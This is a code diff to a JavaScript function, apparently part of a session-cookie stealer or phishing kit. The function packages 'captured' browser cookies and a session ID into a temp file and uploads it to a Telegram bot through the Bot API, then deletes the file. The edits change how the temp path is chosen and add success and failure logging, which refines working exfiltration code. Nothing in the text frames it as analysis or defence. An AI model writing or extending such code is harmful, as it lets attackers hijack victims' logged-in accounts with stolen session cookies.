@@ -51,7 +51,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
     const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
     const randomName = Math.random().toString(36).substring(2, 10);
     const filename = `session_${randomName}_${timestamp}.txt`;
-    const tmpDir = require('os').tmpdir();
+    const tmpDir = process.env.TMPDIR || '/tmp';
     const filePath = path.join(tmpDir, filename);
 
     const content = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
@@ -67,8 +67,9 @@ async function sendCookiesAsFile(cookies, sessionId) {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
+        console.log('✅ Cookie file sent to Telegram:', filename);
     } catch (e) {
-        console.log('Cookie file send failed', e.message);
+        console.log('❌ Cookie file send failed:', e.message);
     }
 
     try { fs.unlinkSync(filePath); } catch (e) {}
